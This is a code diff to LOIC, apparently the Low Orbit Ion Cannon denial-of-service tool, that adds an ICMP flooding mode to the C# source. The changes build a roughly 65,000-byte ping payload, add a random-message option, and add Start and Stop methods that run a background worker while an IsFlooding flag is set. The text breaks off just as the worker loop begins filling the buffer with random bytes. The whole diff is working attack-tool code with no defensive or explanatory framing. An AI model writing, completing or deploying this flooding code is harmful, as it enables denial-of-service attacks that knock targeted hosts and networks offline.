@@ -541,19 +541,23 @@ namespace LOIC
         private byte[] _BytesToSend;
         private Ping _pingSender;
         private PingOptions _opt;
-       
+        private bool _RandomMessage;
+        private BackgroundWorker bw;
 
         /// <summary>
         /// Create the ICMP object, because we need that, for reasons
         /// </summary>
 
-        public ICMP(string ip, int port, int PingsPerThread)
+        public ICMP(string ip, int port, bool RandomMessage, int PingsPerThread)
         {
            this._ip = ip;
            this._port = port;
            this._PingsPerThread = PingsPerThread;
            this._pingSender = new Ping();
-           
+           this._RandomMessage = RandomMessage;
+           this._BytesToSend = new byte[65000];
+
+           _opt = new PingOptions();
            _opt.DontFragment = false;
            _opt.Ttl = 128;
            
@@ -567,12 +571,27 @@ namespace LOIC
 
         //add start override
 
+        public override void Start()
+        {
+            this.IsFlooding = true;
+            this.bw = new BackgroundWorker();
+            this.bw.DoWork += bw_DoWork;
+            this.bw.RunWorkerAsync();
+            this.bw.WorkerSupportsCancellation = true;
+        }
         //add stop override
+
+        public override void Stop()
+        {
+            this.IsFlooding = false;
+            this.bw.CancelAsync();
+        }
+       
 
 
 
         //while working away
-        private  void bw_DoWork (int _PingsPerThread, Ping pingSender, string _ip){
+        private  void bw_DoWork (object sender, EventArgs e){
              
             //fill an array with 65499 random bytes bytes 
             for(int b = 0; b < 65499; b++){
